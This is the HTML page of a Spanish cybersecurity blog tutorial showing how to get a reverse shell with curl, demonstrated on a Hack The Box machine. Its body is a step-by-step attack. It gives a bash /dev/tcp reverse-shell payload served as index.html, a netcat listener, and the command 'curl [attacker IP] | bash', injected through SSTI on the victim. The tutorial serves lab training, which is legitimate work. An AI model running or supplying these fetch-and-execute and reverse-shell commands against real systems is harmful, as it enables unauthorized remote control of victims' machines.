<!-------------------------------------------------------------------------------->
<!-------------------------------------------------------------------------------->

<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=4e466187f8c7aec736a8844fc4931d346df15ea7">     <!-- Archivo CSS O SCSS Jekyll -->
    <!-- <link rel="stylesheet" href="/assets/css/icon-style.css"> -->                                  <!-- Archivo CSS O SCSS del Buscador -->
    <script src="https://kit.fontawesome.com/41bcea2ae3.js" crossorigin="anonymous"></script>           <!-- Archivo Java para importar fuentes -->

  <!---------------------- Configuración de Colores ------------------------------->

    <meta name="theme-color" content="#151515">
    <meta name="msapplication-navbutton-color" content="#151515">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

  <!--------------------- Begin Jekyll SEO tag v2.8.0 ----------------------------->

   <title>F1r0x | Blog sobre Ciberseguridad.</title>
   <link rel="icon" href="/assets/images/logoweb.ico">
   <meta name="generator" content="Jekyll v3.9.2" />
   <meta property="og:title" content="F1r0x" />
   <meta property="og:locale" content="en_US" />
   <meta name="description" content="Blog sobre Ciberseguridad." />
   <meta property="og:description" content="Blog sobre Ciberseguridad." />
   <link rel="canonical" href="https://f1r0x.github.io/Web/reverse_shell_curl.html" />         <!-- ¡¡¡ Cambiar !!!  -->
   <meta property="og:url" content="https://f1r0x.github.io/Web/reverse_shell_curl.html" />    <!-- ¡¡¡ Cambiar !!!  -->
   <meta property="og:site_name" content="F1r0x" />
   <meta property="og:type" content="website" />
   <meta name="twitter:card" content="summary" />
   <meta property="twitter:title" content="F1r0x" />
   <script type="application/ld+json">
   {"@context":"https://schema.org","@type":"WebPage","description":"Blog sobre Ciberseguridad.","headline":"F1r0x","url":"https://f1r0x.github.io/portada.html"}</script>

</head>

<!--------------------------- Encabezado de la página ---------------------------------->

<header>
  <div class="container">
    <a id="a-title" href="/">
      <h5>F1r0x</h5>                                                                                                    <!-- Nombre del Autor -->                         
    </a>
    <h6>Shell</h6>                                                                                 <!-- Descripción de la Página-->

<!--------------------------------- Botón Github ---------------------------------------->    
    <section id="downloads">         
      <a href="https://github.com/F1r0x/f1r0x.github.io" class="btn btn-github"><span class="icon"></span>GitHub</a>    <!-- Contenido del botón Github -->
    </section>
  </div>
</header>

<!---------------------------------  Buscador  ------------------------------------------>

<!--
<body>
<div id="a-buscador" class="buscar">
  <input type="text" class="buscar_texto" placeholder="Escrive lo que buscas">
  <a href="" class="boton">
  <i class="icon-buscar"></i>
  </a>
</div>
</body>
-->

<!----------------------------------------------------------------------------------------->
<!----------------------------------------------------------------------------------------->
<!---------------------- Contenido del Cuerpo de la Página -------------------------------->  
<!------------------------------ Botones y Efectos  --------------------------------------->
<!----------------------------------------------------------------------------------------->

<div class="container">
  
<!----------------------------- Imagen Hack The Box -------------------------------------->   

<!--
  <section id="main_content">
    <p><a href="./hackthebox.html" style="text-decoration:none">
          <img src="https://user-images.githubusercontent.com/103068924/186534363-a36084e5-2626-4b25-976c-ab2d232462f5.gif" align="middle" />
       </a>
    </p>
  </section>
-->

<!--------------------------------  Letrero Animado  --------------------------------------->      
 
  <svg viewBox="0 0 1320 300">

    <!-- Símbolo -->
    <symbol id="s-text">
      <text text-anchor="middle"
            x="50%" y="50%" dy=".35em">
        Curl   <!-- Palabra del Letrero-->
      </text>
    </symbol>  
  
    <!-- Añadir en función de las letras de la palabra -->
    <use xlink:href="#s-text" class="text"></use><!--1-->
    <use xlink:href="#s-text" class="text"></use><!--2-->  
    <use xlink:href="#s-text" class="text"></use><!--3-->
    <use xlink:href="#s-text" class="text"></use><!--4-->
    <use xlink:href="#s-text" class="text"></use><!--5-->
    <use xlink:href="#s-text" class="text"></use><!--6-->
    <use xlink:href="#s-text" class="text"></use><!--7-->
    <use xlink:href="#s-text" class="text"></use><!--8-->
    <use xlink:href="#s-text" class="text"></use><!--9-->
  </svg>

<!----------------------------------------------------------------------------------------->
<!----------------------------------------------------------------------------------------->
<!---------------------------- Contenido de la Página ------------------------------------->  
<!----------------------------------------------------------------------------------------->
<!----------------------------------------------------------------------------------------->

<h1 id="como-establecer-una-reverse-shell-con-el-comando-curl">Como establecer una reverse Shell con el comando Curl</h1>

<p>En este artículo vamos a ver como establecer una <code class="language-plaintext highlighter-rouge">reverse shell</code> mediante una petición con <code class="language-plaintext highlighter-rouge">Curl</code>.</p>

<h2 id="qué-es-curl">¿Qué es Curl?</h2>

<p>Curl es una herramienta cuya finalidad es transferir datos a través de una URL. Es un comando disponible en la mayoría de los
sistemas basados en Unix. Es una abreviatura de <code class="language-plaintext highlighter-rouge">Client URL</code>. Los comandos de Curl están diseñados para funcionar como una forma
de verificar la conectividad a las URL y como una gran herramienta para transferir datos.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/180313605-edaba56e-d31d-4c74-bf50-4db5bfa3b27e.png" alt="Captura de pantalla 2022-07-21 225432" /></p>

<ul>
  <li>Información más detallada del funcionamiento de Curl –&gt; <a href="https://www.hostinger.es/tutoriales/comando-curl" style="text-decoration:none">Link</a></li>
</ul>

<h1 id="ejecución">Ejecución:</h1>

<p>Para realizar esta operación lo primero que debemos comprobar es que podamos realizar la petición desde el equipo víctima y que este tenga Curl instalado.
Una vez tenemos esto solucionado vamos a ver el funcionamiento de manera básica.</p>

<p>Cuando realizamos una petición con Curl desde la máquina víctima:</p>

<p>curl [Ip de Escucha]</p>

<p>curl 10.10.14.25</p>

<p>Y nosotros nos ponemos en escucha desde nuestra terminal, utilizando un servicio HTTP montado con Python 3 por el puerto 80:</p>

<p>sudo python3 -m http.server 80</p>

<p>El funcionamiento es el siguiente, cuando Curl envía una petición a nuestro equipo, estamos realizando una petición a <code class="language-plaintext highlighter-rouge">HTTP</code> tratando de conseguir
un <code class="language-plaintext highlighter-rouge">Index.html</code> (Para poder interpretar la página), aquí es donde viene la trampa.</p>

<p>Lo que nosotros vamos a hacer es crear nuestro propio archivo <code class="language-plaintext highlighter-rouge">index.html</code>, de forma que por dentro tenga los comandos para establecer una reverse shell con bash.
De esta manera, cuando hagamos la petición por Curl y le ordenemos ejecutarlo con bash se nos abrirá la reverse shell que hayamos establecido.</p>

<p>El archivo <code class="language-plaintext highlighter-rouge">index.html</code> debe guardarse en el mismo directorio desde donde utilicemos el servicio HTTP.</p>

<h1 id="ejemplo-práctico">Ejemplo Práctico:</h1>

<p>Vamos a necesitar tres terminales, una desde donde ejecutar la petición por Curl desde el equipo víctima, una segunda donde usaremos el servicio HTTP para 
compartir el archivo <code class="language-plaintext highlighter-rouge">index.html</code> y una tercera donde nos pondremos en escucha con <code class="language-plaintext highlighter-rouge">NetCat</code> (Aquí recibiremos la reverse shell).</p>

<p>Lo primero que vamos a hacer es preparar nuestro archivo <code class="language-plaintext highlighter-rouge">index.html</code>, creamos una carpeta llamada <code class="language-plaintext highlighter-rouge">shell</code> independiente para que nos sea más fácil:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo mkdit shell
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/180318634-9039e512-5dab-4cf7-99fb-d69fe8dcbca0.png" alt="Captura de pantalla -2022-07-21 23-14-02" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd shell
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/180318659-f19f4da8-ff95-44fb-b46a-8f63f949987a.png" alt="Captura de pantalla -2022-07-21 23-15-05" /></p>

<p>Ahora creamos y definimos nuestro archivo <code class="language-plaintext highlighter-rouge">index.html</code>:</p>

<p>sudo nano index.html</p>

<p><img src="https://user-images.githubusercontent.com/103068924/180318692-e916b8a3-e127-4171-98ee-b01605450d1e.png" alt="Captura de pantalla -2022-07-21 23-15-52" /></p>

<p>Copiamos y pegamos el siguiente código:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash

bash -i &gt;&amp; /dev/tcp/[Vuestra Ip]/[Puesto de escucha de NetCat] 0&gt;&amp;1

</code></pre></div></div>

<p>Debería de quedar algo así:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash

bash -i &gt;&amp; /dev/tcp/10.10.14.25/443 0&gt;&amp;1
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/180318722-2a5ec9c3-9b86-48e4-bcdf-9f47bc9b7fb0.png" alt="Captura de pantalla -2022-07-21 23-16-43" /></p>

<p>Una vez copiado con vuestros datos, guardáis (Ctrl x O) y salís (Ctrl + X).</p>

<p>Bien, ya tenemos nuestra reverse shell en bash preparada y apuntado al puerto 443. Ahora, desde la misma terminal y permaneciendo en el directorio que contenga
el archivo que acabamos de crear, vamos a ejecutar el servicio HTTP con Python 3 para poder compartir el archivo <code class="language-plaintext highlighter-rouge">index.html</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo python3 -m http.server 80
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/180318750-583af3f0-3979-408a-8f19-24cbd4ac1e26.png" alt="Captura de pantalla -2022-07-21 23-18-18" /></p>

<p><img src="https://user-images.githubusercontent.com/103068924/180318759-76287747-7934-4bdd-b26b-fcd37566e552.png" alt="Captura de pantalla -2022-07-21 23-18-32" /></p>

<p>Abrimos nuestra segunda terminal y ponemos a <code class="language-plaintext highlighter-rouge">Netcat</code> en escucha por el puerto 443:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nc -lvnp 443
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/180318801-a0c03212-776c-406e-b262-ddfeb9f5937e.png" alt="Captura de pantalla -2022-07-21 23-18-57" /></p>

<p><img src="https://user-images.githubusercontent.com/103068924/180318810-361fce3a-2a9c-4a80-84e5-3a9761e055e5.png" alt="Captura de pantalla -2022-07-21 23-19-19" /></p>

<p>Ya tenemos nuestro puerto preparado para recibir la reversehe shell.</p>

<p>Finalmente, nos dirigimos a la terminal donde estemos en contacto con la víctima, es este ejemplo realizaré la petición usando BurpSuite ejecutando el comando
dentro de un SSTI. Pero básicamente, lo que debemos es realizar la siguiente petición desde el equipo víctima:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl 10.10.14.25 | bash
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Curl</code> : Realizará la petición y copiará el archivo index.html desde nuestro servidor creado en Python 3.</li>
  <li><code class="language-plaintext highlighter-rouge">bash</code> : Ordena la ejecución o interpretación del comando definido dentro del archivo, en nuestro caso, establecer una reverse shell por el puerto 443.</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/103068924/180316903-81849cbf-96b0-4de3-a9f4-c7e0ab2e6610.png" alt="Captura de pantalla 2022-07-21 231821" /></p>

<p><img src="https://user-images.githubusercontent.com/103068924/180316657-1d03c885-ca4e-41b2-b55d-23f1a8e55b59.png" alt="Captura de pantalla 2022-07-21 231506" /></p>

<p>Como podéis ver, el comando Curl está dentro de la inyección SSTI, de tal forma que ya solo quedaría enviar la petición. También podemos ver como en la terminal del servidor HTTP nos indica un <code class="language-plaintext highlighter-rouge">Get</code> con código de confirmación <code class="language-plaintext highlighter-rouge">200</code>.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/180319019-ed62f921-811c-4b97-8b3d-2f9557c84a39.png" alt="Captura de pantalla -2022-07-21 23-19-53" /></p>

<p>Tras ejecutar este último comando se nos tendría que haber abierto una Shell en la terminal por la que estábamos en escucha con NetCat.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/180319039-d19ac07c-d705-49d3-ba1f-237aa719bd23.png" alt="Captura de pantalla -2022-07-21 23-20-30" /></p>

<p><img src="https://user-images.githubusercontent.com/103068924/180319054-b99354ac-dc6f-4500-b035-6ce8b802428e.png" alt="Captura de pantalla -2022-07-21 23-20-07" /></p>

<p>Para este ejemplo hemos utilizado la máquina Nunchuchks de Hack the Box.</p>



<!----------------------------------------------------------------------------------------->
<!----------------------------------------------------------------------------------------->
<!---------------------------- Fin del contenido de la Página ----------------------------->  
<!----------------------------------------------------------------------------------------->
<!----------------------------------------------------------------------------------------->


<!----------------------------------  Menu lateral  --------------------------------------->

<body id="body">
    
<div class="icon__menu">
<i class="fas fa-bars" id="btn_open"></i>
</div>

<div class="menu__side" id="menu_side">

<!--- Botón Youtube --- 
<div class="name__page">
<i class="fab fa-youtube"></i>
<h4>F1r0x</h4>
</div>
-->

<div class="options__menu">	

<a href="../portada.html" class="selected">
<div class="option">
<i class="fas fa-home" title="Inicio"></i>
<h4>Inicio</h4>
</div>
</a>

<a href="./articulos.html">
<div class="option">
<i class="far fa-file" title="Artículos"></i>
<h4>Artículos</h4>
</div>
</a>
            
<a href="./cursos.html">
<div class="option">
<i class="fas fa-video" title="Cursos"></i>
<h4>Cursos</h4>
</div>
</a>

<a href="./hackthebox.html">
<div class="option">
<i class="far fa-sticky-note" title="Hack the Box"></i>
<h4>HTB</h4>
</div>
</a>

<a href="./contacto.html">
<div class="option">
<i class="far fa-id-badge" title="Contacto"></i>
<h4>Contacto</h4>
</div>
</a>

<a href="./referencias.html">
<div class="option">
<i class="far fa-address-card" title="Referencias"></i>
<h4>Referencias</h4>
</div>
</a>

</div>

</div>

<script src="../js/script.js"></script>  <!-- Archivo Java para el menú lateral responsive -->
</body>

<!-------------------------------------  Gestor de Comentrarios  ---------------------------------->

<html lang="en">
  <div id="comentarios">
    <body>
      <script src="https://utteranc.es/client.js" repo="F1r0x/gestion-comentarios" issue-term="pathname" theme="github-light" crossorigin="anonymous" async="">
      </script>         
    </body>
  </div>
</html>

<!-------------------------------------------------------------------------------------------------->

    </div>
</html>

<!------------------------------------------------------------------------------------------------->
<!------------------------------------------------------------------------------------------------->